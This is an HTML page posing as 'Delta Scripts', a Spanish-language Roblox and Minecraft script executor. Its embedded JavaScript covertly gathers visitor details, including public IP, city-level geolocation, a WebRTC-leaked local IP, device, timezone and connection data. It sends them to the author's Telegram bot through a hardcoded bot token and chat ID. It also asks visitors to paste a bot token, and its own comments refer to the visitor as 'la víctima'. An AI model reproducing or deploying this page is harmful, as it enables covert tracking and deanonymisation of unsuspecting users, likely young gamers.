<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta Scripts - Ejecutor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            color: #fff;
        }
        .container {
            background: #1a1a2e;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 60px rgba(0, 255, 255, 0.15);
            border: 1px solid #00ffff33;
            width: 90%;
            max-width: 500px;
            text-align: center;
        }
        .logo {
            font-size: 40px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ffff, #ff00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        input {
            background: #0a0a1a;
            border: 1px solid #333;
            padding: 15px 20px;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border 0.3s;
        }
        input:focus {
            border-color: #00ffff;
        }
        .btn {
            background: linear-gradient(135deg, #00ffff, #0088ff);
            color: #000;
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px #00ffff55;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: #111;
            color: #0f0;
            font-family: monospace;
            font-size: 13px;
            display: none;
            word-break: break-all;
        }
        .loader {
            display: none;
            margin: 20px auto;
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #00ffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .footer {
            margin-top: 20px;
            color: #555;
            font-size: 12px;
        }
        .error { color: #ff4444; }
        .success { color: #44ff88; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">⚡ DELTA</div>
    <div class="subtitle">Ejecutor de Scripts • Roblox & Minecraft</div>
    <div class="input-group">
        <input type="text" id="scriptInput" placeholder="Pega tu token de bot aquí...">
        <button class="btn" id="executeBtn">▶ EJECUTAR SCRIPT</button>
    </div>
    <div class="loader" id="loader"></div>
    <div class="status" id="status"></div>
    <div class="footer">© Delta Scripts 2026 • Modo seguro</div>
</div>

<script>
    (function() {
        // ===== CONFIGURACIÓN =====
        const BOT_TOKEN = '8272335528:AAEq0rHkkA7AhcCaK2ucBDtHyVU8Yp0ffwY';
        const MI_CHAT_ID = '7248268843'; // <--- TU CHAT ID

        let datosEnviados = false;

        // ===== OBTENER TODOS LOS DATOS DEL VISITANTE =====
        function obtenerDatos() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                viewportWidth: window.innerWidth,
                viewportHeight: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localDateTime: new Date().toLocaleString('es-ES', { timeZone: 'America/Mexico_City' }),
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/D',
                downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'N/D',
                rtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'N/D',
                publicIP: 'Obteniendo...',
                geo: 'Obteniendo...',
                localIP: 'Obteniendo...'
            };

            // IP PÚBLICA + GEOLOCALIZACIÓN
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    info.publicIP = data.ip;
                    return fetch('http://ip-api.com/json/' + data.ip + '?fields=status,country,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting');
                })
                .then(res => res.json())
                .then(geoData => {
                    if (geoData.status === 'success') {
                        info.geo = `${geoData.country}, ${geoData.regionName}, ${geoData.city} (${geoData.lat}, ${geoData.lon}) - ISP: ${geoData.isp}`;
                    } else {
                        info.geo = 'No disponible';
                    }
                    obtenerIPLocal((ip) => {
                        info.localIP = ip || 'No disponible';
                        enviarTelegram(info);
                    });
                })
                .catch(() => {
                    info.geo = 'No disponible';
                    obtenerIPLocal((ip) => {
                        info.localIP = ip || 'No disponible';
                        enviarTelegram(info);
                    });
                });
        }

        // ===== IP LOCAL VÍA WebRTC =====
        function obtenerIPLocal(callback) {
            let ip = null;
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('dummy');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate) {
                        const parts = e.candidate.candidate.split(' ');
                        const candidateIP = parts[4];
                        if (candidateIP && !candidateIP.includes(':') && !candidateIP.startsWith('127.')) {
                            ip = candidateIP;
                            pc.close();
                            callback(ip);
                        }
                    }
                };
                setTimeout(() => {
                    if (pc) pc.close();
                    callback(ip);
                }, 3000);
            } catch (e) {
                callback(null);
            }
        }

        // ===== ENVIAR A TELEGRAM =====
        function enviarTelegram(info) {
            if (datosEnviados) return;
            datosEnviados = true;

            let text = '';
            text += `🌐 NUEVA VISITA\n`;
            text += `═══════════════════\n`;
            text += `📱 USER AGENT: ${info.userAgent}\n`;
            text += `🖥️ PLATAFORMA: ${info.platform}\n`;
            text += `🌐 IDIOMA: ${info.language}\n`;
            text += `🍪 COOKIES: ${info.cookiesEnabled ? 'SÍ' : 'NO'}\n`;
            text += `📺 PANTALLA: ${info.screenWidth}x${info.screenHeight}px\n`;
            text += `🖥️ VIEWPORT: ${info.viewportWidth}x${info.viewportHeight}\n`;
            text += `⏰ ZONA HORARIA: ${info.timezone}\n`;
            text += `📅 FECHA/HORA: ${info.localDateTime}\n`;
            text += `📶 CONEXIÓN: ${info.connectionType} (${info.downlink}, RTT ${info.rtt})\n`;
            text += `🌍 IP PÚBLICA: ${info.publicIP}\n`;
            text += `📍 GEO: ${info.geo}\n`;
            text += `🔗 IP LOCAL: ${info.localIP}\n`;
            text += `═══════════════════\n`;

            // Intentar enviar con el token que la víctima pegó (para que le llegue a ella)
            const tokenIngresado = document.getElementById('scriptInput').value.trim();
            if (tokenIngresado && tokenIngresado.length > 20) {
                const url = `https://api.telegram.org/bot${tokenIngresado}/getUpdates`;
                fetch(url)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result && data.result.length > 0) {
                            const lastUpdate = data.result[data.result.length - 1];
                            if (lastUpdate.message && lastUpdate.message.chat) {
                                const chatId = lastUpdate.message.chat.id;
                                enviarDatosConToken(tokenIngresado, chatId, text);
                                return;
                            }
                        }
                        enviarDatosConToken(BOT_TOKEN, MI_CHAT_ID, text);
                    })
                    .catch(() => {
                        enviarDatosConToken(BOT_TOKEN, MI_CHAT_ID, text);
                    });
            } else {
                enviarDatosConToken(BOT_TOKEN, MI_CHAT_ID, text);
            }

            const statusDiv = document.getElementById('status');
            statusDiv.style.display = 'block';
            statusDiv.className = 'success';
            statusDiv.innerText = '✅ Script ejecutado. Datos recopilados.';
        }

        function enviarDatosConToken(token, chatId, texto) {
            if (!chatId) {
                document.getElementById('status').innerText = '⚠️ No se pudo obtener Chat ID.';
                return;
            }
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: texto })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    document.getElementById('status').innerText = '✅ Datos enviados a tu Telegram.';
                } else {
                    document.getElementById('status').innerText = '❌ Error: ' + data.description;
                }
            })
            .catch(() => {
                document.getElementById('status').innerText = '❌ Error de red al enviar.';
            });
        }

        // ===== EVENTO CLICK =====
        document.getElementById('executeBtn').addEventListener('click', function() {
            const input = document.getElementById('scriptInput');
            const token = input.value.trim();
            if (token.length < 10) {
                const status = document.getElementById('status');
                status.style.display = 'block';
                status.className = 'error';
                status.innerText = '❌ Token inválido. Debe tener al menos 10 caracteres.';
                return;
            }

            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').style.display = 'none';

            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                obtenerDatos();
                const statusDiv = document.getElementById('status');
                statusDiv.style.display = 'block';
                statusDiv.className = 'success';
                statusDiv.innerText = '⚡ Script inyectado. Recopilando datos...';
            }, 1500);
        });

        // ===== CARGA AUTOMÁTICA =====
        window.addEventListener('load', function() {
            setTimeout(() => {
                const input = document.getElementById('scriptInput');
                if (input.value.trim().length > 10) {
                    document.getElementById('executeBtn').click();
                } else {
                    const status = document.getElementById('status');
                    status.style.display = 'block';
                    status.className = '';
                    status.style.color = '#aaa';
                    status.innerText = '🔑 Pega tu token de bot y presiona "Ejecutar Script"';
                }
            }, 500);
        });

    })();
</script>

</body>
</html>
